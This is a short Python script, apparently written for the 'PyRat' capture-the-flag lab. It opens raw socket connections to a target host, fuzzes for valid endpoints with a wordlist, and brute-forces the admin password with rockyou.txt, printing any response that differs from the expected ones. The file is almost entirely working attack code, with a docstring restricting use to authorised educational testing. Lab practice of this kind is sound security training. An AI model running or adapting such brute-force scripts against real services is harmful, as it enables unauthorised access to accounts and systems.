"""
PyRat CTF Netcat Fuzzing Script

This script is designed for the PyRat Capture The Flag (CTF) challenge. It provides two fuzzing functions:

1. endpoint_fuzz(): Attempts to discover valid endpoints by sending words from a wordlist to the target server.
2. password_fuzz(): Tries to brute-force the admin password by testing words from a wordlist.

The script uses socket connections to communicate with the target server and can be customized by modifying
the wordlist, host, and port variables at the top of the file.

Usage:
- Adjust the wordlist, host, and port variables as needed for the specific CTF challenge.
- Uncomment the desired fuzzing function call at the bottom of the script.
- Run the script to start fuzzing the target server.

Note: This script is intended for educational purposes and should only be used on systems you have permission to test.
"""

import socket

wordlist = "rockyou.txt" # change this
host = "pyrat.thm" # change this
port = 8000 # change this
bufsize = 1024

def endpoint_fuzz():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((host, port))
        with open(wordlist, "r") as f:
            for line in f.readlines():
                s.sendall(line.strip().encode() + b'\n')
                response = s.recv(bufsize)
                if b"defined" not in response.lower() and b'leading zeros' not in response and response != b'\n':
                    print(f"{line} -> {response}")

def password_fuzz():
    with open(wordlist, "r") as f:
        for line in f:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((host, port))
                s.sendall(b"admin" + b"\n")
                response = s.recv(bufsize)
                if b"Password:" in response:
                    s.sendall(line.encode())
                    response = s.recv(bufsize)
                    if b"Password" not in response:
                        print(f"Got strange response: {response} from payload: {line}")

password_fuzz()
